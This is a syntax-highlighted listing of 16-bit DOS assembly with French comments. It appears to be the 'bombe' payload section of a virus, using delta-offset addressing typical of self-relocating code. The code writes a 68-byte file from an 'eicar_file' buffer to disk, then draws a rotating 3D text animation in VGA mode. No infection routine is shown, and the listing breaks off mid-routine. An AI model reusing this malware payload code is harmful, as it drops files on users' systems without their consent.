        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">045H</span><span class="sc4">,</span><span class="sc2">021H</span><span class="sc4">,</span><span class="sc2">024H</span><span class="sc4">,</span><span class="sc2">048H</span><span class="sc4">,</span><span class="sc2">02BH</span><span class="sc4">,</span><span class="sc2">048H</span><span class="sc4">,</span><span class="sc2">02AH</span><span class="sc0">

</span><span class="sc5">bombe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">eicar_file</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_file</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68d</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">;******************** BOMBE *****************************</span><span class="sc0">
</span><span class="sc1">;************************************************************</span><span class="sc0">

</span><span class="sc1">;----------------initialisation du VGA-----------------------------</span><span class="sc0">
    
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">            </span><span class="sc1">; Init vga</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc1">;------------------ajuster la couleur 7 en noir--------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3c8h</span><span class="sc0">    </span><span class="sc1">;dx = port d'ecriture de la palette</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">;on ecrit la premiere couleur dans le port</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">;on passe a la definition des couleurs</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;-----------on affiche le message 3D--------------------- </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message3D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;--------creation de la table des coords x,y pour la 3D--------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A000h</span><span class="sc0">  </span><span class="sc1">;ds:si = début vidéo</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;es:di = zone stockage des coords</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc0">           </span><span class="sc1">;à partir d'une zone de 10 lignes, 55 colonnes</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;marqueur de fin de ligne</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">table3D</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">;c'est un pixel de la lettre?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;stocker le X</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;stocker le Y</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nb_points_3D</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_fin_de_ligne3D</span><span class="sc0">  </span><span class="sc1">;si dl=0 on est en fin de ligne</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;dans ce cas, on remet le compteur a 128</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">-</span><span class="sc2">62</span><span class="sc0">          </span><span class="sc1">;et on ajuste le pointeur video sur ligne suivante</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">pas_fin_de_ligne3D</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">table3D</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                            
</span><span class="sc1">;-----------on affiche le message 2D--------------------- </span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message2D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;--------------creation de la table des coord 2D-----------------</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">table2D</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nb_points_2D</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">fin2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pas_fin_de_ligne2D</span><span class="sc0">  </span><span class="sc1">;si dl=55 on est en fin de ligne</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;dans ce cas, on remet le compteur a 0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">-</span><span class="sc2">48</span><span class="sc0">          </span><span class="sc1">;et on ajuste le pointeur video sur ligne suivante</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">pas_fin_de_ligne2D</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">table2D</span><span class="sc0">

</span><span class="sc1">;------------------initialiser les segments----------------------</span><span class="sc0">
</span><span class="sc1">;ici ds=vidéo es=cs</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">erase3d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nb_points_3D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">erase2d</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">mainloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;---------------calculer nouvelle valeur angle/sin/cos----------------</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">angle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">angle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">SinCos</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;chope sinus</span><span class="sc0">
</span><span class="sc6">cbw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sin</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;sauve sinus</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">SinCos</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;chope cosinus</span><span class="sc0">
</span><span class="sc6">cbw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">cos</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;sauve cosinus</span><span class="sc0">

</span><span class="sc1">;                         ********************</span><span class="sc0">
</span><span class="sc1">;                         **    PARTIE 3D   **</span><span class="sc0">
</span><span class="sc1">;                         ********************</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">nb_points_3D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">anim3D</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------mettre les coords x,y,z dans leurs zones mémoire-------------</span><span class="sc0">

</span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;si = X </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;si+1 = Y</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Y</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Z</span><span class="sc4">],-</span><span class="sc2">50</span><span class="sc0">

</span><span class="sc1">;------------------rotation autour de l'axe X---------------------------</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Y</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rotation</span><span class="sc0">

</span><span class="sc1">;------------------rotation autour de l'axe Y---------------------------</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rotation</span><span class="sc0">

</span><span class="sc1">;------------------rotation autour de l'axe Z---------------------------</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rotation</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">; ----------calculer position sur l'ecran, plotter--------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">              </span><span class="sc1">;Xoff*X / Z+Zoff = x ecran</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Z</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">300</span><span class="sc0">              </span><span class="sc1">;distance</span><span class="sc0">
</span><span class="sc6">idiv</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">160</span><span class="sc0">              </span><span class="sc1">;centrer les x</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">              </span><span class="sc1">;Yoff*Y / Z+Zoff = screen y</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">y</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Z</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">300</span><span class="sc0">              </span><span class="sc1">;distance</span><span class="sc0">
</span><span class="sc6">idiv</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">              </span><span class="sc1">;centrer les y</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">320</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">;ax = (y*320)+x</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">erase3D</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">;sauver offset pour effacer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Z</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;couleur en fonction de la profondeur Z</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">318</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

